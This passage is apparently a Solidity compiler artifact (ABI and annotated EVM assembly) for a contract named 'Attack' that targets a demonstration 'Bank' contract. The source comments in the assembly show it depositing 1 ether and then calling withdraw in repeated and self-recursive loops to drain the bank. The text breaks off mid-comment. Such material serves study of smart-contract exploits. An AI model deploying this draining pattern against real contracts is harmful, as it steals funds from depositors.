{
	"Bank.sol": {
		"Attack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "contract Bank",
							"name": "_bank",
							"type": "address"
						}
					],
					"stateMutability": "payable",
					"type": "constructor"
				},
				{
					"stateMutability": "payable",
					"type": "fallback"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "attackDeposit1ETH",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "attacker2GetBalanceBank",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "attacker3GetBalanceBank",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "attackerGetBalanceBank",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "getBalance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "withdrawDeposit1ETH",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"Bank.sol\":2027:3265  contract Attack {... */\n  mstore(0x40, 0x80)\n    /* \"Bank.sol\":2065:2132  constructor(Bank _bank) payable {... */\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_1\n  swap2\n  swap1\n  tag_2\n  jump\t// in\ntag_1:\n    /* \"Bank.sol\":2119:2124  _bank */\n  dup1\n    /* \"Bank.sol\":2107:2111  bank */\n  0x00\n  dup1\n    /* \"Bank.sol\":2107:2125  bank = Bank(_bank) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"Bank.sol\":2065:2132  constructor(Bank _bank) payable {... */\n  pop\n    /* \"Bank.sol\":2027:3265  contract Attack {... */\n  jump(tag_5)\n    /* \"#utility.yul\":88:205   */\ntag_7:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_9:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_10:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_9\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:676   */\ntag_11:\n    /* \"#utility.yul\":617:624   */\n  0x00\n    /* \"#utility.yul\":646:670   */\n  tag_22\n    /* \"#utility.yul\":664:669   */\n  dup3\n    /* \"#utility.yul\":646:670   */\n  tag_10\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":635:670   */\n  swap1\n  pop\n    /* \"#utility.yul\":568:676   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":682:828   */\ntag_12:\n    /* \"#utility.yul\":767:803   */\n  tag_24\n    /* \"#utility.yul\":797:802   */\n  dup2\n    /* \"#utility.yul\":767:803   */\n  tag_11\n  jump\t// in\ntag_24:\n    /* \"#utility.yul\":760:765   */\n  dup2\n    /* \"#utility.yul\":757:804   */\n  eq\n    /* \"#utility.yul\":747:822   */\n  tag_25\n  jumpi\n    /* \"#utility.yul\":818:819   */\n  0x00\n    /* \"#utility.yul\":815:816   */\n  dup1\n    /* \"#utility.yul\":808:820   */\n  revert\n    /* \"#utility.yul\":747:822   */\ntag_25:\n    /* \"#utility.yul\":682:828   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":834:1001   */\ntag_13:\n    /* \"#utility.yul\":903:908   */\n  0x00\n    /* \"#utility.yul\":934:940   */\n  dup2\n    /* \"#utility.yul\":928:941   */\n  mload\n    /* \"#utility.yul\":919:941   */\n  swap1\n  pop\n    /* \"#utility.yul\":950:995   */\n  tag_27\n    /* \"#utility.yul\":989:994   */\n  dup2\n    /* \"#utility.yul\":950:995   */\n  tag_12\n  jump\t// in\ntag_27:\n    /* \"#utility.yul\":834:1001   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1007:1382   */\ntag_2:\n    /* \"#utility.yul\":1089:1095   */\n  0x00\n    /* \"#utility.yul\":1138:1140   */\n  0x20\n    /* \"#utility.yul\":1126:1135   */\n  dup3\n    /* \"#utility.yul\":1117:1124   */\n  dup5\n    /* \"#utility.yul\":1113:1136   */\n  sub\n    /* \"#utility.yul\":1109:1141   */\n  slt\n    /* \"#utility.yul\":1106:1225   */\n  iszero\n  tag_29\n  jumpi\n    /* \"#utility.yul\":1144:1223   */\n  tag_30\n  tag_7\n  jump\t// in\ntag_30:\n    /* \"#utility.yul\":1106:1225   */\ntag_29:\n    /* \"#utility.yul\":1264:1265   */\n  0x00\n    /* \"#utility.yul\":1289:1365   */\n  tag_31\n    /* \"#utility.yul\":1357:1364   */\n  dup5\n    /* \"#utility.yul\":1348:1354   */\n  dup3\n    /* \"#utility.yul\":1337:1346   */\n  dup6\n    /* \"#utility.yul\":1333:1355   */\n  add\n    /* \"#utility.yul\":1289:1365   */\n  tag_13\n  jump\t// in\ntag_31:\n    /* \"#utility.yul\":1279:1365   */\n  swap2\n  pop\n    /* \"#utility.yul\":1235:1375   */\n  pop\n    /* \"#utility.yul\":1007:1382   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"Bank.sol\":2027:3265  contract Attack {... */\ntag_5:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"Bank.sol\":2027:3265  contract Attack {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x2a26d5bd\n      gt\n      tag_10\n      jumpi\n      dup1\n      0x2a26d5bd\n      eq\n      tag_6\n      jumpi\n      dup1\n      0x82094433\n      eq\n      tag_7\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_8\n      jumpi\n      dup1\n      0xc3eeda78\n      eq\n      tag_9\n      jumpi\n      jump(tag_2)\n    tag_10:\n      dup1\n      0xd87ec3\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x0a3115a7\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x12065fe0\n      eq\n      tag_5\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n      stop\n        /* \"Bank.sol\":2219:2375  function attacker3GetBalanceBank() public payable {... */\n    tag_3:\n      tag_15\n      tag_16\n      jump\t// in\n    tag_15:\n      stop\n        /* \"Bank.sol\":2851:2942  function attackDeposit1ETH() public payable {... */\n    tag_4:\n      tag_17\n      tag_18\n      jump\t// in\n    tag_17:\n      stop\n        /* \"Bank.sol\":3169:3263  function getBalance() public view returns (uint) {... */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_19\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_19:\n      pop\n      tag_20\n      tag_21\n      jump\t// in\n    tag_20:\n      mload(0x40)\n      tag_22\n      swap2\n      swap1\n      tag_23\n      jump\t// in\n    tag_22:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"Bank.sol\":2948:3045  function withdrawDeposit1ETH() public payable {... */\n    tag_6:\n      tag_24\n      tag_25\n      jump\t// in\n    tag_24:\n      stop\n        /* \"Bank.sol\":2381:2628  function attacker2GetBalanceBank() public payable {... */\n    tag_7:\n      tag_26\n      tag_27\n      jump\t// in\n    tag_26:\n      stop\n        /* \"Bank.sol\":3051:3163  function attack() public payable {... */\n    tag_8:\n      tag_28\n      tag_29\n      jump\t// in\n    tag_28:\n      stop\n        /* \"Bank.sol\":2635:2846  function attackerGetBalanceBank() public payable {... */\n    tag_9:\n      tag_30\n      tag_31\n      jump\t// in\n    tag_30:\n      stop\n        /* \"Bank.sol\":2219:2375  function attacker3GetBalanceBank() public payable {... */\n    tag_16:\n        /* \"Bank.sol\":2275:2281  uint i */\n      0x00\n        /* \"Bank.sol\":2284:2286  10 */\n      0x0a\n        /* \"Bank.sol\":2275:2286  uint i = 10 */\n      swap1\n      pop\n        /* \"Bank.sol\":2296:2369  while (i > 0){... */\n    tag_33:\n        /* \"Bank.sol\":2307:2308  0 */\n      0x00\n        /* \"Bank.sol\":2303:2304  i */\n      dup2\n        /* \"Bank.sol\":2303:2308  i > 0 */\n      gt\n        /* \"Bank.sol\":2296:2369  while (i > 0){... */\n      iszero\n      tag_34\n      jumpi\n        /* \"Bank.sol\":2319:2323  bank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Bank.sol\":2319:2332  bank.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x2e1a7d4d\n        /* \"Bank.sol\":2333:2340  1 ether */\n      0x0de0b6b3a7640000\n        /* \"Bank.sol\":2319:2341  bank.withdraw(1 ether) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_35\n      swap2\n      swap1\n      tag_36\n      jump\t// in\n    tag_35:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_37\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_37:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_39\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_39:\n      pop\n      pop\n      pop\n      pop\n        /* \"Bank.sol\":2357:2358  1 */\n      0x01\n        /* \"Bank.sol\":2355:2356  i */\n      dup2\n        /* \"Bank.sol\":2355:2358  i-1 */\n      tag_40\n      swap2\n      swap1\n      tag_41\n      jump\t// in\n    tag_40:\n        /* \"Bank.sol\":2351:2358  i = i-1 */\n      swap1\n      pop\n        /* \"Bank.sol\":2296:2369  while (i > 0){... */\n      jump(tag_33)\n    tag_34:\n        /* \"Bank.sol\":2269:2375  {... */\n      pop\n        /* \"Bank.sol\":2219:2375  function attacker3GetBalanceBank() public payable {... */\n      jump\t// out\n        /* \"Bank.sol\":2851:2942  function attackDeposit1ETH() public payable {... */\n    tag_18:\n        /* \"Bank.sol\":2905:2909  bank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Bank.sol\":2905:2917  bank.deposit */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xd0e30db0\n        /* \"Bank.sol\":2925:2932  1 ether */\n      0x0de0b6b3a7640000\n        /* \"Bank.sol\":2905:2935  bank.deposit{value: 1 ether}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_43\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_43:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_45\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_45:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"Bank.sol\":2851:2942  function attackDeposit1ETH() public payable {... */\n      jump\t// out\n        /* \"Bank.sol\":3169:3263  function getBalance() public view returns (uint) {... */\n    tag_21:\n        /* \"Bank.sol\":3212:3216  uint */\n      0x00\n        /* \"Bank.sol\":3235:3256  address(this).balance */\n      selfbalance\n        /* \"Bank.sol\":3228:3256  return address(this).balance */\n      swap1\n      pop\n        /* \"Bank.sol\":3169:3263  function getBalance() public view returns (uint) {... */\n      swap1\n      jump\t// out\n        /* \"Bank.sol\":2948:3045  function withdrawDeposit1ETH() public payable {... */\n    tag_25:\n        /* \"Bank.sol\":3004:3008  bank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Bank.sol\":3004:3017  bank.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x2e1a7d4d\n        /* \"Bank.sol\":3018:3037  1000000000000000000 */\n      0x0de0b6b3a7640000\n        /* \"Bank.sol\":3004:3038  bank.withdraw(1000000000000000000) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_48\n      swap2\n      swap1\n      tag_36\n      jump\t// in\n    tag_48:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_49\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_49:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_51\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_51:\n      pop\n      pop\n      pop\n      pop\n        /* \"Bank.sol\":2948:3045  function withdrawDeposit1ETH() public payable {... */\n      jump\t// out\n        /* \"Bank.sol\":2381:2628  function attacker2GetBalanceBank() public payable {... */\n    tag_27:\n        /* \"Bank.sol\":2438:2450  bool success */\n      0x00\n        /* \"Bank.sol\":2464:2468  bank */\n      dup1\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Bank.sol\":2456:2474  address(bank).call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Bank.sol\":2475:2518  abi.encodeWithSignature(\"getBalanceBank()\") */\n      add(0x24, mload(0x40))\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n      and(not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff), 0x791b886000000000000000000000000000000000000000000000000000000000)\n      0x20\n      dup3\n      add\n      dup1\n      mload\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n      dup4\n      dup2\n      dup4\n      and\n      or\n      dup4\n      mstore\n      pop\n      pop\n      pop\n      pop\n        /* \"Bank.sol\":2456:2519  address(bank).call(abi.encodeWithSignature(\"getBalanceBank()\")) */\n      mload(0x40)\n      tag_53\n      swap2\n      swap1\n      tag_54\n      jump\t// in\n    tag_53:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup7\n      gas\n      call\n      swap2\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_57\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_56)\n    tag_57:\n      0x60\n      swap2\n      pop\n    tag_56:\n      pop\n        /* \"Bank.sol\":2437:2519  (bool success, ) = address(bank).call(abi.encodeWithSignature(\"getBalanceBank()\")) */\n      pop\n      swap1\n      pop\n        /* \"Bank.sol\":2529:2622  while (success){... */\n    tag_58:\n        /* \"Bank.sol\":2536:2543  success */\n      dup1\n        /* \"Bank.sol\":2529:2622  while (success){... */\n      iszero\n      tag_59\n      jumpi\n        /* \"Bank.sol\":2554:2558  bank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Bank.sol\":2554:2567  bank.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x2e1a7d4d\n        /* \"Bank.sol\":2568:2575  1 ether */\n      0x0de0b6b3a7640000\n        /* \"Bank.sol\":2554:2576  bank.withdraw(1 ether) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_60\n      swap2\n      swap1\n      tag_36\n      jump\t// in\n    tag_60:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_61\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_61:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_63\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_63:\n      pop\n      pop\n      pop\n      pop\n        /* \"Bank.sol\":2586:2611  attacker2GetBalanceBank() */\n      tag_64\n        /* \"Bank.sol\":2586:2609  attacker2GetBalanceBank */\n      tag_27\n        /* \"Bank.sol\":2586:2611  attacker2GetBalanceBank() */\n      jump\t// in\n    tag_64:\n        /* \"Bank.sol\":2529:2622  while (success){... */\n      jump(tag_58)\n    tag_59:\n        /* \"Bank.sol\":2431:2628  {... */\n      pop\n        /* \"Bank.sol\":2381:2628  function attacker2GetBalanceBank() public payable {... */\n      jump\t// out\n        /* \"Bank.sol\":3051:3163  function attack() public payable {... */\n    tag_29:\n        /* \"Bank.sol\":3094:3098  bank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Bank.sol\":3094:3106  bank.deposit */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xd0e30db0\n        /* \"Bank.sol\":3114:3121  1 ether */\n      0x0de0b6b3a7640000\n        /* \"Bank.sol\":3094:3124  bank.deposit{value: 1 ether}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_66\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_66:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_68\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_68:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"Bank.sol\":3134:3138  bank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Bank.sol\":3134:3147  bank.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x2e1a7d4d\n        /* \"Bank.sol\":3148:3155  1 ether */\n      0x0de0b6b3a7640000\n        /* \"Bank.sol\":3134:3156  bank.withdraw(1 ether) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_69\n      swap2\n      swap1\n      tag_36\n      jump\t// in\n    tag_69:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_70\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_70:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_72\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_72:\n      pop\n      pop\n      pop\n      pop\n        /* \"Bank.sol\":3051:3163  function attack() public payable {... */\n      jump\t// out\n        /* \"Bank.sol\":2635:2846  function attackerGetBalanceBank() public payable {... */\n    tag_31:\n        /* \"Bank.sol\":2691:2703  bool success */\n      0x00\n        /* \"Bank.sol\":2717:2721  bank */\n      dup1\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Bank.sol\":2709:2727  address(bank).call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Bank.sol\":2728:2771  abi.encodeWithSignature(\"getBalanceBank()\") */\n      add(0x24, mload(0x40))\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n      and(not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff), 0x791b886000000000000000000000000000000000000000000000000000000000)\n      0x20\n      dup3\n      add\n      dup1\n      mload\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n      dup4\n      dup2\n      dup4\n      and\n      or\n      dup4\n      mstore\n      pop\n      pop\n      pop\n      pop\n        /* \"Bank.sol\":2709:2772  address(bank).call(abi.encodeWithSignature(\"getBalanceBank()\")) */\n      mload(0x40)\n      tag_74\n      swap2\n      swap1\n      tag_54\n      jump\t// in\n    tag_74:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup7\n      gas\n      call\n      swap2\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_77\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_76)\n    tag_77:\n      0x60\n      swap2\n      pop\n    tag_76:\n      pop\n        /* \"Bank.sol\":2690:2772  (bool success, ) = address(bank).call(abi.encodeWithSignature(\"getBalanceBank()\")) */\n      pop\n      swap1\n      pop\n        /* \"Bank.sol\":2782:2840  while (success){... */\n    tag_78:\n        /* \"Bank.sol\":2789:2796  success */\n      dup1\n        /* \"Bank.sol\":2782:2840  while (success){... */\n      iszero\n      tag_79\n      jumpi\n        /* \"Bank.sol\":2807:2811  bank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Bank.sol\":2807:2820  bank.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x2e1a7d4d\n        /* \"Bank.sol\":2821:2828  1 ether */\n      0x0de0b6b3a7640000\n        /* \"Bank.sol\":2807:2829  bank.withdraw(1 ether) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_80\n      swap2\n      swap1\n      tag_36\n      jump\t// in\n    tag_80:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_81\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_81:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_83\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_83:\n      pop\n      pop\n      pop\n      pop\n        /* \"Bank.sol\":2782:2840  while (success){... */\n      jump(tag_78)\n    tag_79:\n        /* \"Bank.sol\":2684:2846  {... */\n      pop\n        /* \"Bank.sol\":2635:2846  function attackerGetBalanceBank() public payable {... */\n      jump\t// out\n        /* \"#utility.yul\":7:84   */\n    tag_84:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":73:78   */\n      dup2\n        /* \"#utility.yul\":62:78   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:84   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":90:208   */\n    tag_85:\n        /* \"#utility.yul\":177:201   */\n      tag_98\n        /* \"#utility.yul\":195:200   */\n      dup2\n        /* \"#utility.yul\":177:201   */\n      tag_84\n      jump\t// in\n    tag_98:\n        /* \"#utility.yul\":172:175   */\n      dup3\n        /* \"#utility.yul\":165:202   */\n      mstore\n        /* \"#utility.yul\":90:208   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":214:436   */\n    tag_23:\n        /* \"#utility.yul\":307:311   */\n      0x00\n        /* \"#utility.yul\":345:347   */\n      0x20\n        /* \"#utility.yul\":334:343   */\n      dup3\n        /* \"#utility.yul\":330:348   */\n      add\n        /* \"#utility.yul\":322:348   */\n      swap1\n      pop\n        /* \"#utility.yul\":358:429   */\n      tag_100\n        /* \"#utility.yul\":426:427   */\n      0x00\n        /* \"#utility.yul\":415:424   */\n      dup4\n        /* \"#utility.yul\":411:428   */\n      add\n        /* \"#utility.yul\":402:408   */\n      dup5\n        /* \"#utility.yul\":358:429   */\n      tag_85\n      jump\t// in\n    tag_100:\n        /* \"#utility.yul\":214:436   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":442:545   */\n    tag_86:\n        /* \"#utility.yul\":505:512   */\n      0x00\n        /* \"#utility.yul\":534:539   */\n      dup2\n        /* \"#utility.yul\":523:539   */\n      swap1\n      pop\n        /* \"#utility.yul\":442:545   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":551:611   */\n    tag_87:\n        /* \"#utility.yul\":579:582   */\n      0x00\n        /* \"#utility.yul\":600:605   */\n      dup2\n        /* \"#utility.yul\":593:605   */\n      swap1\n      pop\n        /* \"#utility.yul\":551:611   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":617:811   */\n    tag_88:\n        /* \"#utility.yul\":693:702   */\n      0x00\n        /* \"#utility.yul\":726:805   */\n      tag_104\n        /* \"#utility.yul\":744:804   */\n      tag_105\n        /* \"#utility.yul\":753:803   */\n      tag_106\n        /* \"#utility.yul\":797:802   */\n      dup5\n        /* \"#utility.yul\":753:803   */\n      tag_86\n      jump\t// in\n    tag_106:\n        /* \"#utility.yul\":744:804   */\n      tag_87\n      jump\t// in\n    tag_105:\n        /* \"#utility.yul\":726:805   */\n      tag_84\n      jump\t// in\n    tag_104:\n        /* \"#utility.yul\":713:805   */\n      swap1\n      pop\n        /* \"#utility.yul\":617:811   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":817:1000   */\n    tag_89:\n        /* \"#utility.yul\":930:993   */\n      tag_108\n        /* \"#utility.yul\":987:992   */\n      dup2\n        /* \"#utility.yul\":930:993   */\n      tag_88\n      jump\t// in\n    tag_108:\n        /* \"#utility.yul\":925:928   */\n      dup3\n        /* \"#utility.yul\":918:994   */\n      mstore\n        /* \"#utility.yul\":817:1000   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1006:1280   */\n    tag_36:\n        /* \"#utility.yul\":1125:1129   */\n      0x00\n        /* \"#utility.yul\":1163:1165   */\n      0x20\n        /* \"#utility.yul\":1152:1161   */\n      dup3\n        /* \"#utility.yul\":1148:1166   */\n      add\n        /* \"#utility.yul\":1140:1166   */\n      swap1\n      pop\n        /* \"#utility.yul\":1176:1273   */\n      tag_110\n        /* \"#utility.yul\":1270:1271   */\n      0x00\n        /* \"#utility.yul\":1259:1268   */\n      dup4\n        /* \"#utility.yul\":1255:1272   */\n      add\n        /* \"#utility.yul\":1246:1252   */\n      dup5\n        /* \"#utility.yul\":1176:1273   */\n      tag_89\n      jump\t// in\n    tag_110:\n        /* \"#utility.yul\":1006:1280   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1286:1466   */\n    tag_90:\n        /* \"#utility.yul\":1334:1411   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1331:1332   */\n      0x00\n        /* \"#utility.yul\":1324:1412   */\n      mstore\n        /* \"#utility.yul\":1431:1435   */\n      0x11\n        /* \"#utility.yul\":1428:1429   */\n      0x04\n        /* \"#utility.yul\":1421:1436   */\n      mstore\n        /* \"#utility.yul\":1455:1459   */\n      0x24\n        /* \"#utility.yul\":1452:1453   */\n      0x00\n        /* \"#utility.yul\":1445:1460   */\n      revert\n        /* \"#utility.yul\":1472:1663   */\n    tag_41:\n        /* \"#utility.yul\":1512:1516   */\n      0x00\n        /* \"#utility.yul\":1532:1552   */\n      tag_113\n        /* \"#utility.yul\":1550:1551   */\n      dup3\n        /* \"#utility.yul\":1532:1552   */\n      tag_84\n      jump\t// in\n    tag_113:\n        /* \"#utility.yul\":1527:1552   */\n      swap2\n      pop\n        /* 